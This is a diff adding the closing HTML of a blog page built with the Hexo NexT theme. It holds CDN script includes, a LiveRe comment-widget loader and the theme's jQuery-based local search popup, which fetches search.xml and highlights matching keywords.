+  <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/velocity/1.2.3/velocity.ui.min.js"></script>
+
+  
+  <script type="text/javascript" src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'manual') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
